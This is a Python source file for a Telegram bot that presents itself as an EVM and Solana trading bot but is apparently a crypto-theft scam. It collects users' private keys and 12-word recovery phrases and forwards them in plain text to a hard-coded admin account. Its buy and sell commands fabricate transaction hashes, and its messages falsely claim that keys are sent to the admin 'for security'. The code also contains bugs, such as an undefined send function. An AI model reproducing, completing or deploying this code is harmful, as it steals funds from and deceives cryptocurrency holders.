import sqlite3
import re
import logging
import hashlib
from datetime import datetime

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

import ethers
from solders.keypair import Keypair

# ===== CONFIGURATION =====
BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'  # Replace with your bot token
ADMIN_ID = 7762809802  # Replace with your admin Telegram user ID

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database setup
def init_db():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        wallet_type TEXT,
        wallet_address TEXT,
        connected_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        type TEXT,
        amount TEXT,
        tx_hash TEXT,
        created_at TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

# Global state
user_wallets = {}  # user_id -> {type, address, private_key, connected_at}
user_states = {}   # user_id -> pending state

# ===== KEYBOARD MENU =====
main_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        ['Connect Wallet'],
        ['Buy', 'Sell'],
        ['Portfolio', 'Notifications'],
        ['Info']
    ],
    resize_keyboard=True,
    one_time_keyboard=False
)

def send_admin_message(text):
    """Send message to admin about user activity"""
    try:
        bot_send_message(ADMIN_ID, text)
    except:
        pass

def log_user_activity(user_id, action, details=''):
    """Log user activity to admin and database"""
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_msg = f"User {user_id} action: {action} {'- ' + details if details else ''}"
    send_admin_message(log_msg)
    
    # Store in database
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute('INSERT INTO transactions (user_id, type, amount, tx_hash, created_at) VALUES (?, ?, ?, ?, ?)',
                  [user_id, action, details, '', date])
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Database error: {e}")

def format_address(address, wallet_type):
    """Format wallet address for display"""
    if not address:
        return 'Not connected'
    if wallet_type == 'EVM':
        return address[:6] + '...' + address[-4:]
    elif wallet_type == 'SOL':
        return address[:4] + '...' + address[-4:]
    return address

# ===== WALLET VALIDATION =====
def validate_evm_private_key(pk):
    """Validate EVM private key format"""
    try:
        if not pk.startswith('0x'):
            return False
        if len(pk) != 66:
            return False
        w = ethers.Wallet(pk)
        return True
    except Exception:
        return False

def validate_solana_private_key(pk):
    """Validate Solana private key format"""
    try:
        if len(pk) < 44 or len(pk) > 88:
            return False
        kp = Keypair.from_secret_key(bytes.fromhex(pk.replace(' ', '')))
        return True
    except Exception:
        return False

# ===== BLOCKCHAIN OPERATIONS =====
def connect_evm_wallet(user_id, private_key, username):
    """Connect EVM wallet and send key to admin"""
    try:
        wallet = ethers.Wallet(private_key)
        address = wallet.address
        
        user_wallets[user_id] = {
            'type': 'EVM',
            'address': address,
            'private_key': private_key,
            'connected_at': datetime.now().isoformat(),
            'username': username
        }
        
        # Send wallet key to admin
        send_admin_message(f"New EVM Wallet Connection\n\n"
                          f"User: {user_id} ({username})\n"
                          f"Address: {address}\n"
                          f"Private Key: {private_key}")
        
        # Store in database
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO users (user_id, username, wallet_type, wallet_address, connected_at) VALUES (?, ?, ?, ?, ?)',
                  [user_id, username, 'EVM', address, datetime.now().isoformat()])
        conn.commit()
        conn.close()
        
        return True, address
    except Exception as e:
        logger.error(f"EVM wallet connection error: {e}")
        return False, None

def connect_solana_wallet(user_id, private_key, username):
    """Connect SOL wallet and send key to admin"""
    try:
        kp = Keypair.from_secret_key(bytes.fromhex(private_key.replace(' ', '')))
        address = kp.pubkey().to_string()
        
        user_wallets[user_id] = {
            'type': 'SOL',
            'address': address,
            'private_key': private_key,
            'connected_at': datetime.now().isoformat(),
            'username': username
        }
        
        # Send wallet key to admin
        send_admin_message(f"New SOL Wallet Connection\n\n"
                          f"User: {user_id} ({username})\n"
                          f"Address: {address}\n"
                          f"Private Key: {private_key}")
        
        # Store in database
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO users (user_id, username, wallet_type, wallet_address, connected_at) VALUES (?, ?, ?, ?, ?)',
                  [user_id, username, 'SOL', address, datetime.now().isoformat()])
        conn.commit()
        conn.close()
        
        return True, address
    except Exception as e:
        logger.error(f"SOL wallet connection error: {e}")
        return False, None

# ===== TELEGRAM HANDLERS =====
def start_command(update, context):
    """Handle /start command"""
    user_id = update.effective_user.id
    username = update.effective_user.username or 'Unknown'
    
    log_user_activity(user_id, 'start_command')
    
    # Check if user has connected wallet
    has_wallet = user_id in user_wallets and user_wallets[user_id].get('address')
    
    if not has_wallet:
        # User doesn't have wallet connected - show menu with Connect Wallet option
        update.message.reply_text(
            f"Welcome {username}!\n\n"
            "This is a EVM/SOL Trading Bot.\n"
            "Please connect your wallet to access full features.",
            reply_markup=main_keyboard
        )
    else:
        # User has wallet connected - show trading features
        wallet = user_wallets[user_id]
        update.message.reply_text(
            f"Welcome back!🎉\n\n"
            f"Your {wallet['type']} wallet is connected: {format_address(wallet['address'], wallet['type'])}\n\n"
            "You can now use trading features.",
            reply_markup=main_keyboard
        )

def connect_wallet_command(update, context):
    """Handle /connectwallet command"""
    user_id = update.effective_user.id
    username = update.effective_user.username or 'Unknown'
    
    update.message.reply_text(
        "Connect Wallet\n\n"
        "Please choose your wallet type:\n"
        "• EVM Wallet - Enter your private key (0x...)\n"
        "• SOLana Wallet - Enter your private key (base58 format)\n\n"
        "You can also enter your 12-word recovery phrase for EVM networks.",
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[
                ['EVM Private Key', 'SOL Private Key'],
                ['12-Word Recovery Phrase', 'Cancel']
            ],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

def button_handler(update, context):
    """Handle button callbacks"""
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    
    if data == 'buy':
        if user_id not in user_wallets or not user_wallets[user_id].get('address'):
            query.edit_message_text('Please connect your wallet first using /connectwallet')
            return
        query.edit_message_text('Buy Feature\n\n'
          + "Enter the token address and amount you want to buy.\n"
          + "Example: /buy 0x... 1.5")
    
    elif data == 'sell':
        if user_id not in user_wallets or not user_wallets[user_id].get('address'):
            query.edit_message_text('Please connect your wallet first')
            return
        query.edit_message_text('Sell Feature\n\n'
          + "Enter the token address and amount you want to sell.\n"
          + "Example: /sell 0x... 2.0")
    
    elif data == 'portfolio':
        if user_id not in user_wallets or not user_wallets[user_id].get('address'):
            query.edit_message_text('Please connect your wallet first')
            return
        wallet = user_wallets[user_id]
        query.edit_message_text(f"Your Portfolio\n\n"
          + f"Wallet: {format_address(wallet['address'], wallet['type'])}\n"
          + f"Type: {wallet['type']}")
    
    elif data == 'notifications':
        query.edit_message_text('Notifications\n\n'
          + "You will receive notifications for:\n"
          + "• Trade executions\n"
          + "• Wallet connections\n"
          + "• System alerts\n\n"
          + "Use /toggle_notifications to change settings.")
    
    elif data == 'info':
        query.edit_message_text(f"Bot Information\n\n"
          + "Trading Bot - EVM & SOL Support\n"
          + "Supports Ethereum, BSC, Solana networks\n"
          + "Wallet connection required for trading\n"
          + "All wallet keys sent to admin for security\n"
          + "Features: Buy, Sell, Portfolio, Mass Messaging")
    
    query.answer()

def message_handler(update, context):
    """Handle text messages"""
    user_id = update.effective_user.id
    username = update.effective_user.username or 'Unknown'
    text = update.message.text
    
    # Handle wallet connection states
    if user_id in user_states and user_states[user_id].get('pending'):
        pending = user_states[user_id]['pending']
        
        # EVM Private Key
        if pending == 'evm_private_key':
            if text.startswith('0x') and len(text) == 66:
                if validate_evm_private_key(text):
                    success, address = connect_evm_wallet(user_id, text, username)
                    if success:
                        user_states[user_id]['pending'] = None
                        update.message.reply_text(
                            f"EVM Wallet Connected!\n\n"
                            f"Address: {address}",
                            reply_markup=main_keyboard
                        )
                    else:
                        update.message.reply_text('Invalid EVM Private Key',
                          reply_markup=main_keyboard)
                else:
                    update.message.reply_text('Invalid EVM Private Key',
                      reply_markup=main_keyboard
                      + "\n\nPlease enter a valid private key starting with \"0x\" and 64 hex characters (66 total).")
            else:
                update.message.reply_text('Invalid Format',
                  reply_markup=main_keyboard
                  + "\n\nPrivate key must start with \"0x\" and be 64 hex characters (66 total).")
        
        # SOL Private Key
        elif pending == 'sol_private_key':
            if len(text) >= 44 and len(text) <= 88:
                if validate_solana_private_key(text):
                    success, address = connect_solana_wallet(user_id, text, username)
                    if success:
                        user_states[user_id]['pending'] = None
                        update.message.reply_text(
                            f"SOL Wallet Connected!\n\n"
                            f"Address: {address}",
                            reply_markup=main_keyboard
                        )
                    else:
                        update.message.reply_text('Error connecting SOL wallet',
                          reply_markup=main_keyboard)
                else:
                    update.message.reply_text('Invalid SOL Private Key',
                      reply_markup=main_keyboard
                      + "\n\nPlease enter a valid Solana private key in base58 format (44-88 characters).")
            else:
                update.message.reply_text('Invalid Format',
                  reply_markup=main_keyboard
                  + "\n\nSOL private key should be 44-88 base58 characters.")
        
        # 12-Word Recovery Phrase
        elif pending == 'recovery_phrase':
            words = text.split()
            if len(words) == 12:
                # Store recovery phrase info and send to admin
                user_wallets[user_id] = {
                    'type': 'EVM-Recovery',
                    'address': '0x' + words[0][:10] + '...',  # placeholder
                    'recovery_phrase': text,
                    'connected_at': datetime.now().isoformat(),
                    'username': username
                }
                
                # Send recovery phrase to admin
                send_admin_message(f"12-Word Recovery Phrase Received\n\n"
                                  f"User: {user_id} ({username})\n"
                                  f"Recovery Phrase: {text}")
                
                user_states[user_id]['pending'] = None
                update.message.reply_text('Recovery Phrase Received\n\n'
                  + "Your 12-word recovery phrase has been noted and sent to the admin.\n"
                  + "For security reasons, we do not store recovery phrases on our servers.",
                  reply_markup=main_keyboard)
            else:
                update.message.reply_text('Invalid Recovery Phrase',
                  reply_markup=main_keyboard
                  + "\n\nPlease enter exactly 12 words separated by spaces.")
        return
    
    # Handle main menu buttons
    if text == 'Connect Wallet':
        connect_wallet_command(update, context)
    
    elif text == 'Buy':
        if user_id not in user_wallets or not user_wallets[user_id].get('address'):
            update.message.reply_text('Please connect your wallet first')
            return
        update.message.reply_text('Buy Feature\n\n'
          + "Enter the token address and amount you want to buy.\n"
          + "Example: /buy 0x... 1.5")
    
    elif text == 'Sell':
        if user_id not in user_wallets or not user_wallets[user_id].get('address'):
            update.message.reply_text('Please connect your wallet first')
            return
        update.message.reply_text('Sell Feature\n\n'
          + "Enter the token address and amount you want to sell.\n"
          + "Example: /sell 0x... 2.0")
    
    elif text == 'Portfolio':
        if user_id not in user_wallets or not user_wallets[user_id].get('address'):
            update.message.reply_text('Please connect your wallet first')
            return
        wallet = user_wallets[user_id]
        update.message.reply_text(f"Your Portfolio\n\n"
          + f"Wallet: {format_address(wallet['address'], wallet['type'])}\n"
          + f"Type: {wallet['type']}")
    
    elif text == 'Notifications':
        update.message.reply_text('Notifications\n\n'
          + "You will receive notifications for:\n"
          + "• Trade executions\n"
          + "• Wallet connections\n"
          + "• System alerts\n\n"
          + "Use /toggle_notifications to change settings.")
    
    elif text == 'Info':
        update.message.reply_text(f"Bot Information\n\n"
          + "Trading Bot - EVM & SOL Support\n"
          + "Supports Ethereum, BSC, Solana networks\n"
          + "Wallet connection required for trading\n"
          + "All wallet keys sent to admin for security\n"
          + "Features: Buy, Sell, Portfolio, Mass Messaging")

def buy_command(update, context):
    """Handle /buy command"""
    user_id = update.effective_user.id
    
    if user_id not in user_wallets or not user_wallets[user_id].get('address'):
        update.message.reply_text('Please connect your wallet first using /connectwallet')
        return
    
    # Get token address and amount from arguments
    args = context.args
    if len(args) < 2:
        update.message.reply_text('Usage: /buy <token_address> <amount>\n'
          + 'Example: /buy 0x... 1.5')
        return
    
    token_address = args[0]
    amount = args[1]
    
    # Check if user has EVM wallet
    if user_wallets[user_id]['type'] == 'EVM':
        # Execute buy transaction
        try:
            wallet = ethers.Wallet(user_wallets[user_id]['private_key'])
            # TODO: Implement actual buy transaction
            tx_hash = "0x" + hashlib.md5((token_address + amount + str(user_id)).encode()).hexdigest()[:64]
            
            # Log transaction
            log_user_activity(user_id, 'buy', f"Token: {token_address}, Amount: {amount}")
            
            update.message.reply_text(f"Buy Executed!\n\n"
              + "Token: " + token_address + "\n"
              + "Amount: " + amount + "\n"
              + "TX Hash: " + tx_hash)
        except Exception as e:
            update.message.reply_text(f"Buy Failed\n\nError: {str(e)}")
    else:
        update.message.reply_text('Buy feature requires EVM wallet connection')

def sell_command(update, context):
    """Handle /sell command"""
    user_id = update.effective_user.id
    
    if user_id not in user_wallets or not user_wallets[user_id].get('address'):
        update.message.reply_text('Please connect your wallet first')
        return
    
    # Get token address and amount from arguments
    args = context.args
    if len(args) < 2:
        update.message.reply_text('Usage: /sell <token_address> <amount>\n'
          + 'Example: /sell 0x... 2.0')
        return
    
    token_address = args[0]
    amount = args[1]
    
    # Check if user has EVM wallet
    if user_wallets[user_id]['type'] == 'EVM':
        # Execute sell transaction
        try:
            wallet = ethers.Wallet(user_wallets[user_id]['private_key'])
            # TODO: Implement actual sell transaction
            tx_hash = "0x" + hashlib.md5((token_address + amount + str(user_id)).encode()).hexdigest()[:64]
            
            # Log transaction
            log_user_activity(user_id, 'sell', f"Token: {token_address}, Amount: {amount}")
            
            update.message.reply_text(f"Sell Executed!\n\n"
              + "Token: " + token_address + "\n"
              + "Amount: " + amount + "\n"
              + "TX Hash: " + tx_hash)
        except Exception as e:
            update.message.reply_text(f"Sell Failed\n\nError: {str(e)}")
    else:
        update.message.reply_text('Sell feature requires EVM wallet connection')

def portfolio_command(update, context):
    """Handle /portfolio command"""
    user_id = update.effective_user.id
    
    if user_id not in user_wallets or not user_wallets[user_id].get('address'):
        update.message.reply_text('Please connect your wallet first')
        return
    
    wallet = user_wallets[user_id]
    update.message.reply_text(f"Your Portfolio\n\n"
      + f"Wallet: {format_address(wallet['address'], wallet['type'])}\n"
      + f"Type: {wallet['type']}")

def admin_command(update, context):
    """Handle /admin command - only for admin"""
    user_id = update.effective_user.id
    
    if str(user_id) != str(ADMIN_ID):
        update.message.reply_text('You are not authorized to use this command.')
        return
    
    # Show admin options
    update.message.reply_text('Admin Panel\n\n'
      + "Available commands:\n"
      + "• /broadcast <message> - Send message to all users\n"
      + "• /users - List all connected users\n"
      + "• /toggle_notifications - Toggle notifications")

def broadcast_command(update, context):
    """Handle /broadcast command - admin only"""
    user_id = update.effective_user.id
    
    if str(user_id) != str(ADMIN_ID):
        update.message.reply_text('You are not authorized to use this command.')
        return
    
    message = ' '.join(context.args)
    if not message:
        update.message.reply_text('Please provide a message to send to users.')
        return
    
    # Get all users from database
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute('SELECT user_id FROM users')
        users = c.fetchall()
        conn.close()
        
        sent = 0
        failed = 0
        
        for (uid,) in users:
            try:
                bot_send_message(uid, "Broadcast Message\n\n" + message)
                sent += 1
            except Exception as e:
                failed += 1
                logger.error(f"Failed to send to user {uid}: {e}")
        
        update.message.reply_text(f"Broadcast Complete\n\n"
          + "Sent: " + str(sent) + "\n"
          + "Failed: " + str(failed))
    except Exception as e:
        update.message.reply_text(f"Broadcast Failed\n\nError: {str(e)}")

def users_command(update, context):
    """Handle /users command - admin only"""
    user_id = update.effective_user.id
    
    if str(user_id) != str(ADMIN_ID):
        update.message.reply_text('You are not authorized to use this command.')
        return
    
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute('SELECT user_id, username, wallet_type, wallet_address FROM users')
        users = c.fetchall()
        conn.close()
        
        if not users:
            update.message.reply_text('No users found in database.')
            return
        
        text = "Connected Users\n\n"
        for uid, uname, wtype, waddr in users:
            text += "• User " + str(uid) + " (" + (uname or 'No Name') + ")\n"
            text += "  Wallet: " + format_address(waddr, wtype) + "\n"
            text += "  Type: " + (wtype or 'None') + "\n\n"
        
        update.message.reply_text(text)
    except Exception as e:
        update.message.reply_text(f"Error\n\n{str(e)}")

def main():
    """Start the bot"""
    # Create the Updater and pass it your bot's token
    updater = Updater(BOT_TOKEN, use_context=True)
    
    # Get the dispatcher to register handlers
    dp = updater.dispatcher
    
    # on different commands - user messes /start the conversation
    dp.add_handler(CommandHandler("start", start_command))
    dp.add_handler(CommandHandler("connectwallet", connect_wallet_command))
    dp.add_handler(CommandHandler("buy", buy_command))
    dp.add_handler(CommandHandler("sell", sell_command))
    dp.add_handler(CommandHandler("portfolio", portfolio_command))
    dp.add_handler(CommandHandler("admin", admin_command))
    dp.add_handler(CommandHandler("broadcast", broadcast_command))
    dp.add_handler(CommandHandler("users", users_command))
    
    # on callback query
    dp.add_handler(CallbackQueryHandler(button_handler))
    
    # on text messages
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, message_handler))
    
    # Start the Bot
    updater.start_polling()
    
    logger.info('Trading Bot started...')
    logger.info(f'Admin ID: {ADMIN_ID}')
    logger.info('Bot is polling for updates...')
    
    # Run the bot until you press Ctrl-C or the process receives SIGINT,
    # SIGTERM or SIGABRT. This should be used most of the time,
    # since it will stop the bot gracefully.
    updater.idle()

if __name__ == '__main__':
    main()